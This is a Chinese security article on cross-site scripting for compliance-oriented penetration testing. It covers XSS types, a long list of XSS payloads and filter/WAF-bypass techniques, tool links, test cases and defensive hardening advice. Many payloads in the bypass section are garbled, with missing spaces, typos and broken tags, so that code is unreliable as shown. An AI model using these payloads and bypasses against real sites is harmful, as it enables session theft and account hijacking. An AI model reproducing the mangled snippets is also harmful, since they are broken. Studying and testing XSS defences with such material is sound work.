@@ -1,0 +1,569 @@
+# XSS跨站脚本攻击
+
+阅读量 **801723**
+
+发布时间 : 2022-05-09 11:00:26
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t011b03f482f571714c.jpg)
+
+## 0x01 等保测评项
+
+**GBT 22239-2019《信息安全技术 网络安全等级保护基本要求》** 中，8.1.4.4安全计算环境—入侵防范项中要求包括：
+
+a）应遵循最小安装的原则，仅安装需要的组件和应用程序；
+
+b）应关闭不需要的系统服务、默认共享和高危端口；
+
+c）应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制；
+
+d）应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求；
+
+e）应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞；
+
+f）应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警。
+
+XSS跨站脚本攻击对应访问控制项中要求d），所以安全控制点为 **入侵防范d** 。
+
+**GBT 28448-2019《信息安全技术 网络安全等级保护测评要求》** 中，测评单元（ **L3-CES1-20）** ，该项测评单元包括以下要求：
+
+a）测评指标：应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求。
+
+b）测评对象：业务应用系统、中间件和系统管理软件及系统设计文档等。
+
+c）测评实施包括以下内容：
+
+1）应核查系统设计文档的内容是否包括数据有效性检验功能的内容或者模块；
+
+2）应测试验证是否对人机接口或通信接口输入的内容进行有效性检验。
+
+d）单元判定：如果1）和2）均为肯定，则符合本测评单元指标要求，否则不符合或部分符合本测评单元指标要求。
+
+XSS跨站脚本攻击属于测评单元（L3-CES1-20）中测评实施第2项，故测评单元为 **L3-CES1-20.2** 。
+
+## 0x02 测试内容
+
+通过构造的payload测试系统网站是否存在XSS漏洞。
+
+## 0x03 漏洞原理
+
+### 原理
+
+XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets,
+CSS)的缩写混淆，故缩写为XSS。这是一种将任意 Javascript
+代码插入到其他Web用户页面中执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览该页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如
+cookie窃取等。
+
+XSS属于代码注入的一种，它允许攻击者将代码注入到网页，其他用户在浏览网页时就会受到影响。
+
+### 分类
+
+**反射型：**
+
+又称非持久型XSS，这种攻击属于一次性攻击，只是简单的把用户输入的数据“反射”给浏览器。恶意代码一般存放于链接当中，攻击者将包含XSS代码的恶意链接发送给目标用户，当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS，也就是说攻击者往往需要诱使用户点击恶意链接才能攻击成功。
+
+常见的注入点：网站的搜索栏、用户登录入口、输入表单等地方。常用来窃取客户端Cookie或钓鱼欺骗。
+
+产生的原因一般是网站只是简单的将用户输入的数据直接或未经过完善的安全过滤就在浏览器中输入，导致输出的数据中存在可被浏览器执行的代码数据。
+
+**存储型：**
+
+又称持久型XSS，比反射型XSS更具有威胁性，攻击脚本会永久的存储在目标服务器的数据库或文件中，具有一定的隐蔽性。这种攻击方式多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本与正常信息一起注入到留言中，随着留言被服务器存储下来，恶意脚本也被存储到存储器中。当其他用户浏览这个被注入恶意脚本的留言时，恶意脚本就会在用户的浏览器被执行。存储型XSS能将恶意代码永久的嵌入页面中，所有访问这个页面的用具都将成为受害者。
+
+常见注入点：论坛、博客、留言板、网站的留言、评论、日志等交互处。
+
+造成漏洞原因一般是由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中。
+
+**DOM型**
+
+DoM是文档对象模型（ Document Object Model）的缩写。它是HTML文档的对象表示，同时也是外部内容（例如
+JavaScript）与HTML元素之间的接口。解析树的根节点是“ Document”对象。DOM（ Document object
+model），使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。
+
+DOM型的XSS是通过修改页面DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的
+Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。
+
+并且DOM型XSS是基于JS上的，并不需要与服务器进行交互，它只发生在客户端处理数据的阶段。当用户请求一个包含XSS恶意代码的URL，服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码。
+
+造成漏洞的原因：这是一种基于DOM的跨站，这是客户端脚本本身解析不正确导致的安全问题。
+
+常见注入点：通过js脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段
+
+**反射型XSS与DOM型区别：**
+
+  1. 反射型XSS攻击中，服务器在返回HTML文档的时候，就已经包含了恶意的脚本;
+  2. DOM型ⅩSS攻击中，服务器在返回HTML文档的时候，是不包含恶意脚本的；恶意脚本是在其执行了非恶意脚本后，被注入到文档里的。
+
+通过JS脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。
+
+**MXSS**
+
+不论是服务器端或客户端的XSS过滤器，都认定过滤后的HTM源代码应该与浏览器所渲染后的HTML代码保持一致，至少不会出现很大的出入。
+
+然而，如果用户所提供的富文本内容通过 Javascript
+代码进属性后，一些意外的变化会使得这个认定不再成立：一串看似没有任何危害的HTML代码，将逃过XSS过滤器的检测，最终进入某个DOM节点中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。
+
+随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。这种由于HTML内容进入后发生意外变化（
+mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation），而最终导致XXS的攻击流程，被称为 **突变XSS**
+（mXSs, Mutation based Cross-Site-Scripting
+
+**UXSS**
+
+UXSS全称Universal Cross-Site Scripting，翻译过来就是 **通用型XSS** ，也叫Universal
+XSS。UXSS保留了基本XSS的特点，利用漏洞，执行恶意代码，但是有一个重要的区别：不同于常见的XSS，UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。
+
+通俗的说，就是原来我们进行XSS攻击等都是针对Web应用本身，是因为Web应用本身存在漏洞才能被我们利用攻击；而UXSS不同的是通过浏览器或者浏览器扩展的漏洞来”制作ⅩSS漏洞”，然后剩下的我们就可以像普通XSS那样利用攻击了。
+
+不同于常见的XSS，UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。UXSS
+可以理解为Bypass 同源策略。
+
+### 常见漏洞点
+
+数据交互的地方
+
+GET、POST、Cookies、headers
+
+反馈与浏览
+
+富文本编辑器
+
+各类标签插入和自定义
+
+数据输入的地方
+
+用户资料
+
+关键词、标签、说明
+
+文件上传
+
+## 0x04 代码示例
+
+此段代码中第170行、305行获取请求参数中的groupId值，在未经检查参数合法性的情况下输出在javascript代码中，造成反射型XSS漏洞。
+
+## 0x05 限制绕过
+
+### 常见标签
+
+**< script>alert(1)</script>**
+
+**< img>标签**
+
+<imgsrc=javascript:alert(“xss”)>
+
+<IMGSRC=javascript:alert(String.formCharCode(88,83,83))>
+
+<imgscr=”URL”style=’Xss:expression(alert(/xss));’
+
+<imgsrc=”x”onerror=alert(1)>
+
+<imgsrc=”1″onerror=eval(“alert(‘xss’)”)>
+
+<imgsrc=1onmouseover=alert(‘xss’)>
+
+**< a>标签**
+
+标准格式<ahref=”https://www.baidu.com”>baidu</a>
+
+<ahref=”javascript:alert(‘xss’)”>aa</a>
+
+<ahref=javascript:eval(alert(‘xss’))>aa</a>
+
+<ahref=”javascript:aaa”onmouseover=”alert(/xss/)”>aa</a>
+
+<ahref=””onclick=eval(alert(‘xss’))>aa</a>
+
+<ahref=kycg.asp?ttt=1000onmouseover=prompt(‘xss’)y=2016>aa</a>
+
+**< input>标签**
+
+<inputvalue=””onclick=alert(‘xss’)type=”text”>
+
+<inputname=”name”value=””onmouseover=prompt(‘xss’)bad=””>
+
+<inputname=”name”value=””><script>alert(‘xss’)</script>
+
+**< form>标签**
+
+<formaction=javascript:alert(‘xss’)method=”get”>
+
+<formaction=javascript:alert(‘xss’)>
+
+<formmethod=postaction=aa.asp?onmouseover=prompt(‘xss’)>
+
+<formmethod=postaction=aa.asp?onmouseover=alert(‘xss’)>
+
+<formaction=1onmouseover=alert(‘xss)>
+
+<formmethod=postaction=”data:text/html;base64,<script>alert(‘xss’)</script>”>
+
+<formmethod=postaction=”data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=”>
+
+**< iframe>标签**
+
+<iframesrc=javascript:alert(‘xss’);height=5width=1000/><iframe>
+
+<iframesrc=”data:text/html,&lt;script&gt;alert(‘xss’)&lt;/script&gt;”></iframe>
+
+<iframesrc=”data:text/html;base64,<script>alert(‘xss’)</script>”>
+
+<iframesrc=”data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=”>
+
+<iframesrc=”aaa”onmouseover=alert(‘xss’)/><iframe>
+
+<iframesrc=”javascript&colon;prompt&lpar;xss&rpar;”></iframe>
+
+**< svg>标签**
+
+<svgonload=alert(1)>
+
+**CSS**
+
+<img STYLE=”background-image:url(javascript:alert(‘XSS’))”>
+
+### 限制绕过
+
+实际应用中web程序往往会通过一些过滤规则来防止代有恶意代码的用户输入被显示。当上述代码（常见标签中的代码）被注入到输入框或者URL参数中时，可能会成功也可能会失败，如果失败了，并不意味着网站不存在XSS漏洞，需要对其进行绕过等方式发掘安全漏洞。这里，给大家总结一些XSS绕过方法。
+
+**闭合标签**
+
+常规闭合，通过各种方式，闭合前面的语句。
+
+function escape(input) {
+
+// warm up
+
+// script should be executed without user interaction
+
+return ‘<input type=”text” value=”‘ + input + ‘”>’;
+
+}
+
+“><script>alert(1);script>
+
+双写半开括号
+
+function escape(input) {
+
+// tags stripping mechanism from ExtJS library
+
+// Ext.util.Format.stripTags
+
+var stripTagsRE = /<\/?[^>]+>/gi;
+
+input = input.replace(stripTagsRE, ”);
+
+return ‘<article>’ + input + ‘</article>’;
+
+}
+
+以上代码中正则会处理尖括号和尖括号中的内容，将其替换成空。所以可以使用双写半开括号”<<“绕过:
+
+<img src=1 onerror=”prompt(1)”<
+
+反引号+编码
+
+function escape(input) {
+
+// v– frowny face
+
+input = input.replace(/[=(]/g, ”);
+
+// ok seriously, disallows equal signs and open parenthesis
+
+return input;
+
+}
+
+以上代码对等号和左括号进行过滤，所以使用反引号代替括号，在通过编码解决。
+
+<script>setTimeoutprompt\u00281\u0029;</script>
+
+闭合注释
+
+function escape(input) {
+
+// filter potential comment end delimiters
+
+input = input.replace(/->/g, ‘_’);
+
+// comment the input to avoid script execution
+
+return ‘<!– ‘ + input + ‘ –>’;
+
+}
+
+以上代码将输出的内容放在注释中，且对->做了替换处理。所以html可以–>或–!>闭合注释
+
+–!><script>prompt(1)</script>
+
+闭合大部分的标签
+
+*/–>'”);>iframe>script>style>title>textarea><a>aa>#*/–>'”);>iframe>script>style>title>textarea><iframe >
+
+宽字符闭合
+
+*/–>%cf”%d5′>frame>script>style>title>textarea>
+
+回车换行
+
+很多时候，回车换行能绕过很多的限制
+
+%0D%0A
+
+**标签检测绕过**
+
+fuzz各种标签，检查是否存在拦截或者过滤
+
+  1. **针对黑名单**
+  2. 大小写混写 **< ScRipt>ALeRt(“XSS”);sCRipT>**
+  3. 双写绕过 **< scscriptript>alert(1)</scriscriptpt>**
+  4. 嵌套绕过 **ript >alert(/xss/);script>alert(/xss/);script>**
+  5. 空字符绕过 **，09ipt >ALeRt(/XSS/);sCRipT>**
+  6. 特殊字符黑名单，采用其他字符代替，如：
+
+限制 ” 符号，输入<img src=1 onclick=alert(‘1’)>
+
+限制 ‘ 符号，输入<img src=1 onclick=alert(/1/)>、<img src=1 onclick=”alert(1)”>
+
+限制 () 符号，输入<img src=1 onclick=”alert `’1’`”>
+
+限制 () ‘ ” 符号，输入<img src=1 onclick=alert `1`>
+
+或使用实体编码绕过。
+
+  1. **绕过字符长度限制**
+  2. **利用事件** 缩短长度，如，“onclick=alert(1)//”
+  3. **使用base标签** ，base标签可以运用于页面的任何地方，且作用于之后的所有标签。通过在页面插入base标签，就可以在远程服务器伪造图片，链接或脚本，劫持页面的相对路径的标签。
+  4. **对window.name赋值** ，没有特殊的字符限制。因为window对象是浏览器的窗体，而不是document对象。因此很多时候window对象不受同源策略的限制。可以用这个实现跨域，跨界面的传递。
+
+**3\. 编码绕过**
+
+Javascript的编码
+
+十六进制
+
+Unicode
+
+URL编码
+
+JS编码
+
+HTML实体编码
+
+在线编码/解码工具：[站长工具-编码解码在线](https://tool.chinaz.com/tools/urlencode.aspx)、[107000工具站](https://www.107000.com/)、[在线jsons字符实体转换](https://www.bejson.com/json2javapojo/new/)、[在线HTML字符实体转换](https://www.qqxiuzi.cn/bianma/zifushiti.php)
+
+**4.使用其他标签** ，<a>、<href>、<img>等；
+
+**5.使用空字符，** 在关键词中添加空字符；
+
+**6\. 使用转义字符；**
+
+**常规Waf绕过思路**
+
+[+] 标签语法替换
+
+[+] 特殊符号干扰 比如 / #
+
+[+] 提交方式更改 Request的前提下，Waf只检查URL内容而不检查POST内容
+
+[+] 垃圾数据溢出
+
+[+] 加密解密算法
+
+[+] 结合其他漏洞绕过
+
+**XSS自动化工具**
+
+Xwaf，下载地址：github.com/3xp10it/xwaf
+
+XSStrike，下载地址：github.com/s0md3v/XSStr
+
+Fuzzing测试：
+
+在线生成Fuzzing字典：https://xssfuzzer.com/fuzzer.html
+
+Fuzzing字典：https://github.com/TheKingOfDuck/fuzzDicts
+
+## 0x06 测试过程
+
+**反射型XSS、DOM型XSS**
+
+**验证测试情况**
+
+在网站的搜索栏、用户登录入口、输入表单等处输入payload，查看页面是否有弹框，则存在反射型XSS漏洞；
+
+**现实攻击情况**
+
+攻击者寻找具有XSS漏洞的网站，植入payload构造恶意链接，将恶意链接发给用户，诱骗用户点击，用户点击此链接，XSS攻击执行。
+
+**存储型XSS**
+
+**验证测试情况**
+
+在论坛、博客、留言板、网站的留言、评论、日志等交互处输入payload，查看页面是否有弹框。若有，先切换至网站其他页面，再返回输入payload的页面，若依旧出现弹窗，则存在存储型XSS漏洞。
+
+**现实攻击情况**
+
+攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了
+
+恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。
+
+**常用payload：**
+
+<script>alert(1)</script> // 调用JavaScript语句
+
+<img src=x onerror=alert(1)> // src是错误的 就会调用error函数
+
+<a href=javascript:alert(1)> // 点击a即可触发
+
+<svg onload=alert(1)> // 使用svg标签
+
+### 测试案例1
+
+在机构名称处输入测试代码<script>alert(1)</script>，页面出现弹窗，证明XSS语句已被执行，此网站存在XSS漏洞。
+
+### 测试案例2
+
+在标题处处输入测试代码<script>alert(/XSS/)</script>，页面出现弹窗，点击别的功能模块后再次返回此页面，依旧弹窗，所以此网站存在
+**存储型XSS漏洞** 。
+
+### 测试案例3
+
+**xss挑战之旅**
+
+访问网页，打开浏览器的开发者工具，查看到代码中对尖括号和双引号： **>** **、** **<** **、** **“**
+进行了过滤，但没有过滤’（单引号）。
+
+所以，此处尝试js语句，’ onmouseover=alert(666)//、’ onfocus=javascript:alert(1)
+‘进行测试，但是代码中带有的剩余字符无法闭合，所以使用//进行注释，最终实现XSS弹窗。
+
+## 0x07 风险分析
+
+攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。WEB程序代码中把用户提交的参数未做过滤或过滤不严就直接输出到页面，参数中的特殊字符打破了HTML页面的原有逻辑，攻击者就可以利用该漏洞执行恶意以下操作：
+
+  1. 网络钓鱼，包括获取各类用户账号；
+  2. 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；
+  3. 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等；
+  4. 强制弹出广告页面、刷流量等；
+  5. 网页挂马；
+  6. 进行恶意操作，如任意篡改页面信息、删除文章等；
+  7. 进行大量的客户端攻击，如ddos等；
+  8. 获取客户端信息，如用户的浏览历史、真实p、开放端口等；
+  9. 控制受害者机器向其他网站发起攻击；
+  10. 结合其他漏洞，如csrf，实施进步危害；
+  11. 提升用户权限，包括进一步渗透网站；
+  12. 传播跨站脚本蠕虫等。
+
+## 0x08 加固建议
+
+形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。
+
+因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。
+
+**输入过滤** ：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
+
+**输出转义** ：根据输出点的位置对输出到前端的内容进行适当转义;
+
+### 输入检查
+
+输入检查的逻辑必须放在服务器端代码中实现，如果只是在客户端使用Javascript进行输入检查，很容被绕过。目前Web开发的普遍做法是同时在客户端Javascript中和服务器端代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，而节约服务器资源。
+
+**检查内容：**
+
+a. 检查特殊字符，如<、>、’、”等，如果发现存在特殊字符，则将其过滤或者编码；
+
+b. XSS Filter，会检查XSS特征的敏感字符，如<script>、javascript等敏感字符；
+
+c. 字符串是否超过最大长度限制；
+
+d. 数字是否在指定的范围；
+
+e. 是否符合特殊格式的要求
+
+### 输出检查
+
+一般而言，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码或转译的方式防御XSS攻击。
+
+使用安全的编码函数：
+
+  1. HtmlEncode编码方式，针对HTML代码；
+  2. JavascriptEncode编码方式，针对JavaScript；
+  3. htmlentities()、htmlspecialchars()函数，针对PHP；
+  4. XMLEncode、JSONEncode等。
+
+### 处理富文本
+
+  1. 在过滤富文本时，“事件”应被严格禁止，因为富文本的展示需求里不应该包括“事件”这种动态效果；
+  2. 在标签的选择上，应该使用白名单，避免使用黑名单。白名单同样也应用于属性与事件的选择；
+  3. 尽可能禁止用户自定义CSS与style；
+
+### 防御DOM型XSS
+
+DOM型XSS是一种比较特别的XSS漏洞，以上防御方法不太适用，需要特别对待。
+
+从JavaScript输出到HTML页面，也相当于一次XSS输出的过程，所以需要分语境使用不同的编码函数。
+
+### 其他加固方式
+
+Anti_XSS
+
+微软开发的，.NET平台下的，用于防止XSS攻击的类库，它提供了大量的编码函数来对用户输入的数据进行编码，可以实现基于白名单的输入的过滤和输出的编码。
+
+HttpOnly Cookie
+
+当Cookie在消息头中被设置为HttpOnly时，这样支持Cookie的浏览器将阻止客户端Javascript直接访问浏览器中的Cookies，从而达到保护敏感数据的作用。
+
+Noscript
+
+Noscript是一款免费的开源插件，该插件默认禁止所有的脚本，但可以自定义设置允许通过的脚本。
+
+WAF
+
+使用WAF，比如软件WAF、硬件WAF、云WAF。
+
+在修补XSS漏洞时遇到最大挑战之一就是漏洞数量太多，因此开发者可能来不及也不情愿修补这些漏洞，从业务风险的角度来重新定位每个XSS漏洞，就具有了重要的意义。理论上讲，XSS漏洞虽然复杂，但是却是可以彻底解决的，在设计XSS解决方案时，应该深入理解XSS攻击的原理，针对不同的场景使用不同的方法。同时也可以参考很多的开源项目。
+
+参考
+
+[https://baijiahao.baidu.com/s?id=1711691365751381912&wfr=spider&for=pc](https://baijiahao.baidu.com/s?id=1711691365751381912&wfr=spider&for=pc)
+
+<https://www.jianshu.com/p/63823aabb99d>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Tide安全团队** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/272641](/post/id/272641)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [xss](/tag/xss)
+  * [Web安全](/tag/Web安全)
+
+ **+1** __8赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t013dca47abc465f8d2.png) Tide安全团队
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
